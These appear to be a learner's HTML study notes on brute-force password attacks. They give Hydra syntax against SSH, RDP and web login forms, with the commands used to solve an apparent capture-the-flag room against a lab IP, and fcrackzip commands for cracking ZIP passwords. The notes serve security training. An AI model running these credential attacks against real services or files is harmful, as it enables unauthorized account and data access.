<h2>Brute Force</h2>
<ul>Remote access protocols related:
  <li>SSH: Secure Shell. Remote login. It provides the user with a command-line interface (CLI) that can be used to execute commands.</li>
  <li>RDP: Remote Desktop Protocol; it is also known as Remote Desktop Connection (RDC) or simply Remote Desktop (RD). It provides a graphical user interface (GUI) to access an MS Windows system.</li>
  <li>VNC: Virtual Network Computing. It provides access to a graphical interface which allows the user to view the desktop and (optionally) control the mouse and keyboard. VNC is available for <b>any system</b> with a graphical interface, including MS Windows, Linux, and even macOS, Android and Raspberry Pi.</li>
</ul>
<h3>Hydra</h3>
<p>
  Compatible protocols:
  <ul>
    <li>Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,  HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP.</li>
  </ul>
  Standard format: <b>hydra -l username -P wordlist.txt server service -V</b>
  <ul>
    <li><b>-l username:</b> -l should precede the username, you should omit this option if the service does not use a username.</li>
    <li><b>-P wordlist.txt:</b> file or path to the list of passwords you want to try with the provided username. (Rockyou.txt)</li>
    <li><b>server</b> is the hostname or IP address of the target server.</li>
    <li><b>service</b> indicates the service in which you are trying to launch the dictionary attack. Such as <b>rdp, vnc, ftp, pop3 or any other protocol</b> supported by Hydra. Check list of compatible protocols</li>
    <li>Exemple: hydra -l mark -P /usr/share/wordlists/rockyou.txt MACHINE_IP ssh   or   hydra -l mark -P /usr/share/wordlists/rockyou.txt ssh://MACHINE_IP</li>
  </ul>
  Options you can use:
  <ul>
  <li>-V or -vV, for verbose, makes Hydra show the username and password combinations being tried.</li>
  <li>-d, for debugging, provides more detailed information about what’s happening. The debugging output can save you much frustration; for instance, if Hydra tries to connect to a closed port and timing out, -d will reveal this immediately.</li>
  </ul>
  <h3>Cheatsheat</h3>
  https://github.com/frizb/Hydra-Cheatsheet<br>
</p>
<h2>Hydra Room</h2>
<p>
  Flag 1:<br>
  hydra -l molly -P Documentos/rockyou_20_12_2022.txt 10.10.38.247 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V<br>
  Flag 2:<br>
  hydra -l molly -P Documentos/rockyou_20_12_2022.txt 10.10.38.247 ssh -V<br>
</p>
<h2>ZIP files</h2>
<p>
<h3>fcrackzip</h3>
syntax bruteforce: <i>fcrackzip -b target.zip -u -c a1 -l 'length'</i><br>
<ul>
  <li>fcrackzip – Selecting the tool we want to use.</li>
  <li>-b – Selecting the option for a brute-force attack.</li>
  <li>target.zip is the target</li>
  <li>-u – This makes sure fcrackzip actually tries to unzip the file, without this we won’t actually get the right password.</li>
  <li>-c – This is where we pick the characters we want to use in our dictionary attack. In this example we’re using ‘a’ which represents lowercase letters, and ‘1’ which represents numbers 0-9.</li>
  <li>-l – This is where we state the length of the password we want to crack. If we know the password is between 4 and 6 characters, we would use "-l 4-6".</li>
</ul>
syntax diccionary attack: <i> fcrackzip -D -u -p /path/to/file/rockyou.txt target.zip</i><br>
<ul>
  <li>fcrackzip – Selecting the tool we want to use.</li>
  <li>-D – Selecting the option for a dictionary attack.</li>
  <li>-p – Use strings as password.</li>
  <li>-/path/to/file/rockyou.txt – path to the dictionary list.</li>
  <li>target.zip is the target</li>
</ul>
cheat sheat fcrackzip: https://manpages.ubuntu.com/manpages/trusty/man1/fcrackzip.1.html<br>
</p>
